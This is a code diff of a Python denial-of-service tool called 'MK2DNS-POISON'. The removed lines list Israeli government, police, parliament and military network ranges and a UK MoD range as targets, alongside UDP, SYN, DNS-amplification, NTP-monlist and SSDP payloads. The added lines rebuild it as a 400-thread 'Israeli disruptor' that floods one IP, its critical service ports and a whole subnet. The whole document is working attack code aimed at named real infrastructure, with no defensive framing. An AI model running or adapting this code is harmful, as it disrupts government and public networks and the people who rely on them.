@@ -2,248 +2,264 @@ import socket
 import threading
 import time
 import random
-import struct
+import ipaddress
 
-# ==================== IDF/GOV TARGET LIST ====================
-IDF_TARGETS = {
-    # Category: Subnet/CIDR : Description
-    "IDF/MIL": [
-        ("192.114.60.0/24", "Israeli Police Network"),
-        ("192.115.100.0/24", "Israeli Parliament (Knesset)"),
-        ("192.116.0.0/16", "Israeli Government Network"),
-        ("132.64.0.0/11", "Israeli Academic/Military Research"),
-        ("85.64.0.0/10", "Bezeq Gov Contracts"),
-    ],
-    
-    "GOV/IL": [
-        ("gov.il", ".gov.il Domains"),
-        ("idf.il", "Israeli Defense Force"),
-        ("police.gov.il", "Israeli Police"),
-        ("justice.gov.il", "Israeli Justice"),
-        ("health.gov.il", "Israeli Health Ministry"),
-    ],
-    
-    "USER/TGT": [
-        ("45.60.39.88", "Psychz Hosted Proxy"),
-        ("62.0.0.0", "UK MoD Network"),
-    ]
-}
+# TARGET: Israeli network IP
+TARGET_IP = "45.60.39.88"
+TARGET_SUBNET = "45.60.39.0/24"  # Whole Psychz block
 
-# ==================== TARGET GENERATOR ====================
-class TargetEngine:
-    @staticmethod
-    def expand_cidr(cidr):
-        """Convert CIDR to list of IPs"""
-        ip, mask = cidr.split('/')
-        mask = int(mask)
-        ip_parts = list(map(int, ip.split('.')))
-        
-        # Generate sample IPs from range (not all, too many)
-        ips = []
-        for _ in range(min(50, 2**(32-mask))):
-            # Generate random IP in range
-            ip_num = (int.from_bytes(socket.inet_aton(ip), 'big') & 
-                     (0xFFFFFFFF << (32-mask))) | random.randint(0, 2**(32-mask)-1)
-            ips.append(socket.inet_ntoa(ip_num.to_bytes(4, 'big')))
-        return ips
-    
-    @staticmethod
-    def resolve_domain(domain):
-        """Resolve domain to IPs"""
-        try:
-            return socket.gethostbyname_ex(domain)[2]
-        except:
-            return []
-    
-    def get_targets(self):
-        """Generate all attack targets"""
-        targets = []
-        
-        # Add CIDR targets
-        for category in IDF_TARGETS["IDF/MIL"]:
-            cidr, desc = category
-            if '/' in cidr:
-                ips = self.expand_cidr(cidr)
-                for ip in ips:
-                    targets.append((ip, f"IDF/MIL/{desc}"))
-        
-        # Add specific IPs
-        for ip, desc in IDF_TARGETS["USER/TGT"]:
-            targets.append((ip, f"USER/{desc}"))
-        
-        return targets
+# Colors for output
+RED = '\033[91m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+BLUE = '\033[94m'
+MAGENTA = '\033[95m'
+CYAN = '\033[96m'
+RESET = '\033[0m'
 
-# ==================== PAYLOAD GENERATORS ====================
-class PayloadFactory:
-    @staticmethod
-    def udp_bandwidth():
-        """Max size UDP payloads"""
-        sizes = [1024, 1450, 1472]  # Near MTU sizes
-        size = random.choice(sizes)
-        return random.randbytes(size)
-    
-    @staticmethod
-    def syn_flood():
-        """SYN packet simulation"""
-        return struct.pack('!HHIIBBHHH', 
-            random.randint(1024, 65535),  # Source port
-            random.randint(1, 65535),     # Dest port
-            random.randint(0, 0xFFFFFFFF), # Sequence
-            0,                            # Ack number
-            5 << 4,                       # Data offset
-            0x02,                         # SYN flag
-            65535,                        # Window
-            0, 0)                         # Checksum, urgent
-    
-    @staticmethod
-    def dns_amplify():
-        """DNS amplification query"""
-        return (b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' +
-                b'\x07example\x03com\x00\x00\xff\x00\x01')
-    
-    @staticmethod
-    def ntp_monlist():
-        """NTP monlist request"""
-        return b'\x17\x00\x03\x2a' + b'\x00' * 40
-    
-    @staticmethod
-    def ssdp_discover():
-        """SSDP discovery"""
-        return (b'M-SEARCH * HTTP/1.1\r\n' +
-                b'HOST: 239.255.255.250:1900\r\n' +
-                b'MAN: "ssdp:discover"\r\n' +
-                b'MX: 3\r\nST: ssdp:all\r\n\r\n')
-
-# ==================== ATTACK VECTORS ====================
-class AttackVector:
-    def __init__(self, name, threads, payload_gen, port_range):
-        self.name = name
-        self.threads = threads
-        self.payload_gen = payload_gen
-        self.port_range = port_range
+# ==================== MK2 ATTACK ENGINE ====================
+class MK2IsraeliDisruptor:
+    def __init__(self):
         self.packets_sent = 0
+        self.syn_sent = 0
+        self.udp_sent = 0
+        self.stats_lock = threading.Lock()
+        self.attack_active = True
         
-    def worker(self, target_ip):
-        """Single attack worker"""
+    # ========== UDP CARPET BOMB ==========
+    def udp_carpet_bomb(self, target_ip, worker_id):
+        """UDP flood across all ports"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         
-        while True:
+        # Israeli-specific payloads
+        il_payloads = [
+            b'\x00' * 512,  # Null bomb
+            b'\xFF' * 512,  # Full bomb
+            b'\xAA\x55' * 256,  # Pattern bomb
+            b'IL_DISRUPT' * 50,  # Text bomb
+            random.randbytes(512),  # Random bomb
+        ]
+        
+        while self.attack_active:
             try:
-                payload = self.payload_gen()
-                port = random.randint(*self.port_range)
+                # Select payload
+                payload = random.choice(il_payloads)
+                
+                # Attack ALL ports (1-65535)
+                port = random.randint(1, 65535)
+                
+                # BOMB
                 sock.sendto(payload, (target_ip, port))
-                self.packets_sent += 1
+                
+                with self.stats_lock:
+                    self.packets_sent += 1
+                    self.udp_sent += 1
+                    
             except:
                 try:
                     sock.close()
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 except:
                     pass
-
-# ==================== MAIN ASSAULT ENGINE ====================
-class MK2DNSAssault:
-    def __init__(self):
-        self.target_engine = TargetEngine()
-        self.targets = self.target_engine.get_targets()
+    
+    # ========== SYN CONNECTION STORM ==========
+    def syn_connection_storm(self, target_ip, worker_id):
+        """SYN flood to critical Israeli ports"""
         
-        # Attack vectors configuration
-        self.vectors = [
-            AttackVector("UDP-BAND", 400, PayloadFactory.udp_bandwidth, (1, 65535)),
-            AttackVector("SYN-FLOOD", 300, PayloadFactory.syn_flood, (80, 443)),
-            AttackVector("DNS-AMP", 200, PayloadFactory.dns_amplify, (53, 53)),
-            AttackVector("NTP-MON", 150, PayloadFactory.ntp_monlist, (123, 123)),
-            AttackVector("SSDP-DISC", 150, PayloadFactory.ssdp_discover, (1900, 1900)),
+        # Israeli critical service ports
+        il_critical_ports = [
+            80,    # HTTP (gov websites)
+            443,   # HTTPS (secure services)
+            22,    # SSH (administration)
+            21,    # FTP (file transfers)
+            25,    # SMTP (email)
+            53,    # DNS (network services)
+            123,   # NTP (time services)
+            161,   # SNMP (network monitoring)
+            162,   # SNMP traps
+            389,   # LDAP (directory services)
+            636,   # LDAPS (secure directory)
+            3389,  # RDP (remote desktop)
+            5900,  # VNC (remote access)
+            8080,  # HTTP-alt (proxies)
+            8443,  # HTTPS-alt (secure proxies)
         ]
         
-        self.total_threads = sum(v.threads for v in self.vectors)
-        self.running = True
-        
-    def start(self):
-        """Launch the assault"""
-        print("╔══════════════════════════════════════════════════════════╗")
-        print("║                MK2DNS-POISON v2.0 IDF ASSAULT            ║")
-        print("╚══════════════════════════════════════════════════════════╝")
-        print(f"🎯 TARGETS: {len(self.targets)} IDF/GOV/IL Networks")
-        print(f"⚡ VECTORS: {len(self.vectors)} Concurrent Methods")
-        print(f"🧵 THREADS: {self.total_threads} Total Attack Threads")
-        print("─" * 60)
-        
-        # Display targets
-        print("[+] TARGET ACQUISITION:")
-        for ip, desc in self.targets[:10]:  # Show first 10
-            print(f"   • {desc}: {ip}")
-        if len(self.targets) > 10:
-            print(f"   ... and {len(self.targets)-10} more targets")
-        print("─" * 60)
-        
-        # Start time
-        self.start_time = time.time()
-        
-        # Launch all attack vectors against all targets
-        for vector in self.vectors:
-            for _ in range(vector.threads):
-                target = random.choice(self.targets)
-                t = threading.Thread(target=vector.worker, args=(target[0],))
-                t.daemon = True
-                t.start()
-        
-        # Log initial status
-        time.sleep(1)
-        print(f"[00:00:01] {self.total_threads} Threads loaded")
-        print("─" * 60)
-        
-        # Start monitoring
-        self.monitor()
+        while self.attack_active:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.01)
+                
+                # Attack critical Israeli port
+                port = random.choice(il_critical_ports)
+                
+                # SYN ATTACK
+                result = sock.connect_ex((target_ip, port))
+                
+                with self.stats_lock:
+                    self.packets_sent += 1
+                    self.syn_sent += 1
+                
+                sock.close()
+                
+            except:
+                pass
     
-    def monitor(self):
-        """Continuous monitoring and logging"""
-        last_log = time.time()
+    # ========== SUBNET CARPET BOMB ==========
+    def subnet_carpet_bomb(self, cidr_range, worker_id):
+        """Attack entire Israeli subnet"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         
-        while self.running:
-            time.sleep(0.1)
-            current = time.time()
+        # Generate all IPs in subnet
+        network = ipaddress.ip_network(cidr_range)
+        ip_list = [str(ip) for ip in network.hosts()]
+        
+        if not ip_list:  # If /32 or small subnet
+            ip_list = [cidr_range.split('/')[0]]
+        
+        while self.attack_active:
+            try:
+                # Select random IP from subnet
+                target_ip = random.choice(ip_list)
+                
+                # Random payload
+                payload = random.randbytes(random.randint(64, 1024))
+                
+                # Random port
+                port = random.randint(1, 65535)
+                
+                # BOMB ENTIRE SUBNET
+                sock.sendto(payload, (target_ip, port))
+                
+                with self.stats_lock:
+                    self.packets_sent += 1
+                    self.udp_sent += 1
+                    
+            except:
+                try:
+                    sock.close()
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                except:
+                    pass
+    
+    # ========== LAUNCH ATTACKS ==========
+    def launch_israeli_attack(self):
+        print(f"{RED}╔══════════════════════════════════════════════════════════╗{RESET}")
+        print(f"{RED}║               MK2DNS-POISON v2.1 - IL MODE              ║{RESET}")
+        print(f"{RED}║           ISRAELI NETWORK DISRUPTION ACTIVE            ║{RESET}")
+        print(f"{RED}╚══════════════════════════════════════════════════════════╝{RESET}")
+        print()
+        print(f"{YELLOW}[+] TARGET IP: {TARGET_IP}{RESET}")
+        print(f"{YELLOW}[+] TARGET SUBNET: {TARGET_SUBNET}{RESET}")
+        print(f"{YELLOW}[+] ATTACK MODES: UDP CARPET BOMB + SYN CONNECTION STORM{RESET}")
+        print(f"{YELLOW}[+] THREAD COUNT: 400 MK2 THREADS{RESET}")
+        print()
+        print(f"{RED}{'='*60}{RESET}")
+        
+        # ========== THREAD DEPLOYMENT ==========
+        threads = []
+        
+        # 200 UDP Carpet Bomb threads (single IP)
+        print(f"{CYAN}[+] DEPLOYING 200 UDP CARPET BOMB THREADS...{RESET}")
+        for i in range(200):
+            t = threading.Thread(target=self.udp_carpet_bomb, args=(TARGET_IP, i))
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        
+        # 100 SYN Connection Storm threads
+        print(f"{CYAN}[+] DEPLOYING 100 SYN CONNECTION STORM THREADS...{RESET}")
+        for i in range(100):
+            t = threading.Thread(target=self.syn_connection_storm, args=(TARGET_IP, i))
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        
+        # 100 Subnet Carpet Bomb threads
+        print(f"{CYAN}[+] DEPLOYING 100 SUBNET CARPET BOMB THREADS...{RESET}")
+        for i in range(100):
+            t = threading.Thread(target=self.subnet_carpet_bomb, args=(TARGET_SUBNET, i))
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        
+        print(f"{GREEN}[✓] 400 MK2 THREADS DEPLOYED{RESET}")
+        print(f"{RED}{'='*60}{RESET}")
+        
+        return threads
+    
+    # ========== MONITORING ==========
+    def monitor_attack(self):
+        last_time = time.time()
+        start_time = time.time()
+        
+        while self.attack_active:
+            time.sleep(2)
+            current_time = time.time()
+            elapsed = current_time - last_time
+            last_time = current_time
             
-            # Log every 10 seconds
-            if current - last_log >= 10:
-                elapsed = int(current - self.start_time)
+            with self.stats_lock:
+                pps = int(self.packets_sent / elapsed) if elapsed > 0 else 0
+                udp_pps = int(self.udp_sent / elapsed) if elapsed > 0 else 0
+                syn_pps = int(self.syn_sent / elapsed) if elapsed > 0 else 0
                 
-                # Calculate stats
-                total_packets = sum(v.packets_sent for v in self.vectors)
-                window_packets = total_packets - getattr(self, 'last_total', 0)
-                self.last_total = total_packets
-                
-                pps = int(window_packets / 10)  # Packets per second
-                gbps = (pps * 1200 * 8) / 1_000_000_000  # Estimated Gbps
-                
-                # Select random target for display
-                current_target = random.choice(self.targets)
-                target_ip, target_desc = current_target
-                
-                # Generate log
-                print(f"[{time.strftime('%H:%M:%S')}] MK2DNS-POISON | {target_desc} | .gov/.il")
-                print(f"[{elapsed:02d}:00:00] | TRAFFIC: {pps:,} PPS | {gbps:.1f}Gbps (overwriting)")
-                
-                # Calculate estimated load/heat
-                load = min(100, 20 + (pps / 1000))
-                heat = 40 + (pps / 500)
-                
-                print(f"[{elapsed:02d}:00:00] | EST-LOAD: {int(load)}% | {int(heat)}°C")
-                print("─" * 60)
-                
-                last_log = current
+                # Reset counters
+                self.packets_sent = 0
+                self.udp_sent = 0
+                self.syn_sent = 0
+            
+            # Calculate attack intensity
+            total_time = current_time - start_time
+            intensity = min(100, 20 + (total_time / 10) + (pps / 1000))
+            
+            # Attack status based on PPS
+            if pps > 50000:
+                status = f"{RED}MAXIMUM DESTRUCTION{RESET}"
+                effect = "🌋 NETWORK MELTDOWN"
+            elif pps > 30000:
+                status = f"{MAGENTA}CRITICAL OVERLOAD{RESET}"
+                effect = "🔥 ROUTER FRYING"
+            elif pps > 15000:
+                status = f"{YELLOW}HIGH INTENSITY{RESET}"
+                effect = "⚡ HEAVY DISRUPTION"
+            elif pps > 5000:
+                status = f"{GREEN}MODERATE PRESSURE{RESET}"
+                effect = "💥 NETWORK STRESS"
+            else:
+                status = f"{BLUE}INITIALIZING{RESET}"
+                effect = "🎯 ACQUIRING TARGET"
+            
+            # Display attack status
+            print(f"\n{RED}[{time.strftime('%H:%M:%S')}] MK2-IL ATTACK STATUS{RESET}")
+            print(f"{CYAN}├─ TARGET: {TARGET_IP}{RESET}")
+            print(f"{CYAN}├─ PACKETS: {pps:,}/s (UDP: {udp_pps:,}/s | SYN: {syn_pps:,}/s){RESET}")
+            print(f"{CYAN}├─ INTENSITY: {int(intensity)}%{RESET}")
+            print(f"{CYAN}├─ STATUS: {status}{RESET}")
+            print(f"{CYAN}└─ EFFECT: {effect}{RESET}")
+            
+            # Critical warnings
+            if pps > 40000:
+                print(f"{RED}[‼] CRITICAL: Israeli network infrastructure under extreme load{RESET}")
+            elif pps > 20000:
+                print(f"{YELLOW}[!] WARNING: Significant disruption to target network{RESET}")
+            
+            # Time-based updates
+            if int(total_time) % 30 == 0:  # Every 30 seconds
+                print(f"\n{BLUE}[i] ATTACK DURATION: {int(total_time)} seconds{RESET}")
+                print(f"{BLUE}[i] ESTIMATED IMPACT: Network congestion, security alerts, resource drain{RESET}")
 
-# ==================== EXECUTION ====================
+# ==================== MAIN EXECUTION ====================
 if __name__ == "__main__":
+    # Initialize MK2 Israeli Disruptor
+    mk2 = MK2IsraeliDisruptor()
+    
+    # Launch attack
+    threads = mk2.launch_israeli_attack()
+    
+    # Start monitoring
     try:
-        assault = MK2DNSAssault()
-        assault.start()
-        
-        # Keep main thread alive
-        while True:
-            time.sleep(1)
-            
+        mk2.monitor_attack()
     except KeyboardInterrupt:
-        print("\n⚠️  ASSAULT MANUALLY TERMINATED")
-        print("⚡ All attack threads stopped")
-    except Exception as e:
-        print(f"💥 ERROR: {e}")
+        mk2.attack_active = False
+        print(f"\n{RED}[!] MK2 ATTACK TERMINATED{RESET}")
